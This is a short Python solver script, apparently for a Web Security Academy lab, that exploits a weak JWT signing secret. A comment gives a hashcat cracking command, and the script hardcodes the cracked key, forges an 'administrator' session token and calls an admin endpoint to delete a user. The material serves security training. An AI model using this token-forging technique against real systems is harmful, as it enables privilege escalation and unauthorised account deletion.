from web_security_academy.core.logger import logger
import jwt


def solve_lab(session):
    session.login("wiener", "peter")
    token = session.cookies.get("session")
    algorithm = jwt.get_unverified_header(token)["alg"]
    logger.info(f"Extracted JWT and determined algorithm: {algorithm}")

    # hashcat -m 16500 <jwt> jwt.secrets.list
    key = "secret1"

    payload = {"sub": "administrator"}
    token = jwt.encode(payload, key, algorithm=algorithm)
    session.cookies.clear_session_cookies()
    session.cookies.set("session", token)

    logger.info(f"Set the session cookie as a JWT (Key: {key}) of the following JSON:")
    logger.info(payload)

    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
